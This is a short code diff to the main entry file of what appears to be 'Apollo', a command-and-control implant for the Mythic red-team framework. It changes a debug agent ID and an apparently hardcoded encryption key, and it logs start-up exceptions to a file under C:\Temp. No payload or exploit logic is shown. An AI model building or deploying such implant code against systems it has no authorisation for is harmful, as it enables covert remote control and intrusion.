@@ -1,4 +1,4 @@
-﻿#define C2PROFILE_NAME_UPPER
+#define C2PROFILE_NAME_UPPER
 // supported profiles get undefined
 #if DEBUG
 #undef SMBSERVER
@@ -11,6 +11,7 @@
 using IPC;
 using Mythic.C2Profiles;
 using System;
+using System.IO;
 using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.Serialization.Formatters.Binary;
@@ -22,7 +23,7 @@ namespace Apollo
     {
 
 #if DEBUG
-        public static string AgentUUID = "c6e47c3a-6315-4259-bb58-dcbf32a0ae46";
+        public static string AgentUUID = "8e896559-d770-415b-9635-661afc573053";
 #endif
 
         [STAThread]
@@ -38,7 +39,7 @@ namespace Apollo
             }
             else
             {
-                profile = new DefaultProfile(AgentUUID, "fERC3P0QP/l3nWddCtLlu7qCvUrRV6i1zwS3fq/WX2I=");
+                profile = new DefaultProfile(AgentUUID, "kZvIrF5VJ4mOlmm+tzDpFttLskTlRyC1hZoJzzFZKqs=");
             }
 #else
             DefaultProfile profile = new DefaultProfile();
@@ -52,9 +53,18 @@ namespace Apollo
 #else
 #error NO VALID EGRESS PROFILE SELECTED
 #endif
-
-            Agent implant = new Agent(profile);
-            implant.Start();
+            try
+            {
+                Agent implant = new Agent(profile);
+                implant.Start();
+            }
+            catch (Exception ex)
+            {
+                using (StreamWriter outputFile = new StreamWriter(Path.Combine("C:\\Temp\\", "WriteDebug.txt"), true))
+                {
+                    outputFile.WriteLine(ex.Message);
+                }
+            }
         }
     }
 
